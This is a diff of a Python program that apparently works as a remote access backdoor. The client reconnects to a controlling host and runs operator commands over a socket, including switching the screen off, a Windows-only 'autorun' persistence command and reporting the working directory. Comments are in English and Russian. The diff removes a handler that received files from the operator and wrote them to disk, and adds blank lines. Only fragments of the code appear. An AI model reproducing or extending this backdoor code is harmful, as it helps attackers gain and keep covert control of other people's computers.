@@ -41,6 +41,7 @@ def main():
         sleep(5)
         s.connect((HOST, PORT))
         session()
+
 def screenoff():
     if sys.platform.startswith('linux'):
         os.system("xset dpms force off")
@@ -73,30 +74,6 @@ def session():
             s.close()
             exit(0)
 
-        elif cmd == 'sendfile':
-            # receive the file infos
-            # receive using client socket, not server socket
-            received = s.recv(1024).decode()
-            filename, filesize = received.split(SEPARATOR)
-            # remove absolute path if there is
-            filename = os.path.basename(filename)
-            # convert to integer
-            filesize = int(filesize)
-            # start receiving the file from the socket
-            # and writing to the file stream
-            progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-            with open(filename, "wb") as f:
-                while True:
-                    # read 1024 bytes from the socket (receive)
-                    bytes_read = s.recv(BUFFER_SIZE)
-                    if not bytes_read:
-                        # nothing is received
-                        # file transmitting is done
-                        break
-                    # write to the file the bytes we just received
-                    f.write(bytes_read)
-                    # update the progress bar
-                    progress.update(len(bytes_read))
         # AUTORUN (Only for Windows / Только для Windows)
         elif cmd == "autorun":
             auto_run()
@@ -114,6 +91,7 @@ def session():
                 s.send(bytes("Error:\n" + str(ex) + "\n", encoding="utf-8", errors="ignore"))
 
         # PWD
+
         elif cmd == "pwd":
             try:
                 # Variable with current directory / Переменная с текущей директорией
